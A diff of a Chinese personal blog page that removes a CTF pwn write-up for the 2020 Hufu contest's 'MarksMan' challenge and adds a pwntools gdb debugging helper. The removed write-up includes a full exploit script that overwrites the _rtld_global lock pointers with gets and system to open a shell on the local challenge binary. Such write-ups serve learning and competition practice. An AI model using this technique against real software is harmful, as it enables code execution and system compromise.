@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>数字中国虎符网安大赛2020 | 风云阁</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="数字中国虎符网安大赛2020 | 风云阁">
+  <title>MyGems | 风云阁</title>
+  <meta name="keywords" content=" Pwn , auto ">
+  <meta name="description" content="MyGems | 风云阁">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="tags:[CTF,Pwn]虎符网安大赛2020MarksMan程序逻辑清晰，puts地址白给。提供一个地址连续三个字节写。   此处无故开启dlopen，猜测出题人为了利用里面的关键函数而强行给出的。gdb跟进去调试。  根据函数名称可知，调用了加锁函数。那么想必后面肯定有解锁。   这里调用了指针函数，指针位于数据段，可写。 再往下调试，果然，遇见了解锁函数。   发现此时rdi指向的 _r">
 <meta property="og:type" content="article">
@@ -393,19 +393,27 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-数字中国虎符网安大赛2020" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-MyGems" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">数字中国虎符网安大赛2020</h1>
+        <h1 class="article-title">MyGems</h1>
     
     <div class="article-meta">
         
         
         
+        
+        <span class="tag">
+            
+            <a class="color4">Pwn</a>
+            
+            <a class="color5">auto</a>
+            
+        </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-04-23 13:38:41'>2020-04-23 12:50</time>
+        创建时间:<time class="date" title='更新时间: 2020-04-23 13:51:56'>2020-04-23 13:41</time>
         
     </div>
     <div class="article-meta">
@@ -427,7 +435,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#tags-CTF-Pwn"><span class="toc-text">tags:[CTF,Pwn]</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#虎符网安大赛2020"><span class="toc-text">虎符网安大赛2020</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MarksMan"><span class="toc-text">MarksMan</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MyGems"><span class="toc-text">MyGems</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -443,83 +451,46 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <hr>
-<h2 id="tags-CTF-Pwn"><a href="#tags-CTF-Pwn" class="headerlink" title="tags:[CTF,Pwn]"></a>tags:[CTF,Pwn]</h2><h1 id="虎符网安大赛2020"><a href="#虎符网安大赛2020" class="headerlink" title="虎符网安大赛2020"></a>虎符网安大赛2020</h1><h2 id="MarksMan"><a href="#MarksMan" class="headerlink" title="MarksMan"></a>MarksMan</h2><p>程序逻辑清晰，puts地址白给。提供一个地址连续三个字节写。 </p>
-<p><img src="/2020/04/23/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9B2020/image-20200423125355070.png" alt></p>
-<p>此处无故开启dlopen，猜测出题人为了利用里面的关键函数而强行给出的。gdb跟进去调试。</p>
-<p><img src="/2020/04/23/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9B2020/image-20200423130954219.png" alt></p>
-<p>根据函数名称可知，调用了加锁函数。那么想必后面肯定有解锁。 </p>
-<p><img src="/2020/04/23/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9B2020/image-20200423130939254.png" alt></p>
-<p>这里调用了指针函数，指针位于数据段，可写。</p>
-<p>再往下调试，果然，遇见了解锁函数。</p>
-<p><img src="/2020/04/23/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9B2020/image-20200423131516723.png" alt></p>
-<p><img src="/2020/04/23/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9B2020/image-20200423131228470.png" alt></p>
-<p>发现此时rdi指向的 <code>_rtld_global+2312</code> ，此处可写。计算得到 lock 函数与此处距离1528个字节。</p>
-<p>看一下其他地方有无调用这个加锁解锁函数。</p>
-<p>给这两个地方下断。</p>
-<p><img src="/2020/04/23/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9B2020/image-20200423131958875.png" alt></p>
-<p><img src="/2020/04/23/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9B2020/image-20200423131916976.png" alt></p>
-<p>程序退出调用exit后，会执行到加锁函数。那么攻击思路就浮出水面了。</p>
-<p><img src="/2020/04/23/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9B2020/image-20200423132208719.png" alt></p>
-<ul>
-<li><input disabled type="checkbox"> </li>
-<li><input checked disabled type="checkbox"> <p>篡改函数指针 <code>_rtld_global._dl_rtld_unlock_recursive</code> 为 <code>gets</code></p>
-</li>
-<li><input checked disabled type="checkbox"> <p>向rdi写入 <code>/bin/sh\x00</code> + padding + system。 这样可覆盖 <code>_rtld_global._dl_rtld_lock_recursive</code> 。</p>
-</li>
-</ul>
-<p><strong>exp</strong></p>
-<pre><code class="python">from pwn import * 
-import primedbg 
-import sys 
-context.arch=&#39;amd64&#39;
-z=process(&#39;./chall&#39;)
-libc=ELF(&#39;./libc.so.6&#39;,False)
-z.recvuntil(&#39; near: &#39;)
+        <h1 id="MyGems"><a href="#MyGems" class="headerlink" title="MyGems"></a>MyGems</h1><p><strong>pwntools gdb 调试脚本</strong></p>
+<p><code>attach_dbg_pie(io,brk_pts=[],syms={},init_cmd=[])</code> </p>
+<p><code>brk_pts</code> （断点）和 <code>syms</code> （符号）的地址是低12位，可以在IDA中查看。</p>
+<p><code>init_cmd</code> ：gdb脚本，多行组成的列表。</p>
+<pre><code class="python">from pwn import *
 
-if len(sys.argv)&gt;1:
+def attach_dbg_pie(io,brk_pts=[],syms={},init_cmd=[]):
+    context.log_level=&#39;debug&#39;
+    context.terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
 
-    sub_script=[
-        &#39;directory glibc-2.27/stdlib/&#39;,
-        # &#39;directory glibc-2.27/elf&#39;,
-        #&#39;b *_dl_open+60&#39;
-        &#39;b *_dl_open+236 \n&#39;,
-        #b *rtld_lock_default_lock_recursive\n,
-    ]
+    elf_base=io.libs()[io.cwd+io.argv[0].strip(&#39;.&#39;)]
 
-    script=&#39;\n&#39;.join(sub_script)+&#39;\n&#39;
-    primedbg.attach_dbg_pie(z,[0xd63],[],script)
-    #call rdx 274495 
-    # 0x7f1a42b4ca09 &lt;_dl_fini+105&gt;    call   qword ptr [rip + 0x218551] #6314505
+    cmd = [&#39;b *&#39;+hex(each+elf_base) for each in brk_pts] \
+        + [&#39;set $&#39;+sym+&#39;=&#39;+str(syms[sym]+elf_base) for sym in syms]
 
-puts_adr=int(z.recv(14),16)
-lib_base=puts_adr-0x809c0  
-func_ptr=lib_base+  8511336 #_rtld_global._dl_rtld_unlock_recursive
-gets_adr=lib_base+0x800b0
-sys_adr=lib_base+0x4f440
+    cmd=&#39;\n&#39;.join(cmd)+&#39;\n&#39;
+    cmd += &#39;\n&#39;.join(init_cmd)+&#39;\n&#39;
+    gdb.attach(io,cmd)
 
-one=gets_adr
-o1=one&amp;0xff 
-o2=(one&amp;0xff00)&gt;&gt;8
-o3=(one&amp;0xff0000)&gt;&gt;16
-success(&#39;one_gadgets: %x\n(%x,%x,%x)&#39;%(one,o1,o2,o3))
-success(&#39;libc: %#x\ngets: %#x&#39;%(lib_base,gets_adr))
+def attach_dbg(io,brk_pts=[],syms={},init_cmd=&#39;&#39;):
+    context.log_level=&#39;debug&#39;
+    context.terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
+    cmd = [&#39;b *&#39;+hex(each) for each in brk_pts] \
+        + [&#39;set $&#39;+sym+&#39;=&#39;+str(syms[sym]) for sym in syms]
 
-z.sendlineafter(&#39;t!shoot!&#39;,str(target))
-z.sendlineafter(&#39;iang!\n&#39;,chr(o1))
-z.sendlineafter(&#39;iang!\n&#39;,chr(o2))
-z.sendlineafter(&#39;iang!\n&#39;,chr((o3)))
+    cmd=&#39;\n&#39;.join(cmd)+&#39;\n&#39;
+    cmd += &#39;\n&#39;.join(init_cmd)+&#39;\n&#39;
+    gdb.attach(io,cmd)
+
+def testing():
+    io=process(&quot;./babyheap&quot;)
+    attach_dbg(io,[0x102,0x200,0x2000])
+    io.interactive()
 
 
-payload= &#39;/bin/sh\x00&#39;+p64(0x0)*190+p64(sys_adr) # write _rtld_global._dl_rtld_lock_recursive
-sleep(0.1)
-z.sendline(payload)
-
-z.interactive()
-
-
-# 0x7fbabaf51f60 _rtld_global+3840 _rtld_global._dl_rtld_lock_recursive
-# 0x7fbabaf51f68 &lt;_rtld_global+3848&gt; _rtld_global._dl_rtld_unlock_recursive</code></pre>
+if __name__==&#39;__main__&#39;:
+    testing()</code></pre>
+<p><strong>效果</strong></p>
+<p><img src="/2020/04/23/MyGems/image-20200423135125165.png" alt></p>
+<p><img src="/2020/04/23/MyGems/image-20200423135109179.png" alt></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论。 </span>
@@ -529,12 +500,12 @@ z.interactive()
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>数字中国虎符网安大赛2020</p>
+    <p><span class="copy-title">文章标题:</span>MyGems</p>
     
     <p><span class="copy-title">本文作者:</span><a  title="枫云李">枫云李</a></p>
-    <p><span class="copy-title">发布时间:</span>2020-04-23, 12:50:42</p>
-    <p><span class="copy-title">最后更新:</span>2020-04-23, 13:38:41</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/04/23/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9B2020/" title="数字中国虎符网安大赛2020">https://primelyw.github.io/2020/04/23/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9B2020/</a>
+    <p><span class="copy-title">发布时间:</span>2020-04-23, 13:41:24</p>
+    <p><span class="copy-title">最后更新:</span>2020-04-23, 13:51:56</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/04/23/MyGems/" title="MyGems">https://primelyw.github.io/2020/04/23/MyGems/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
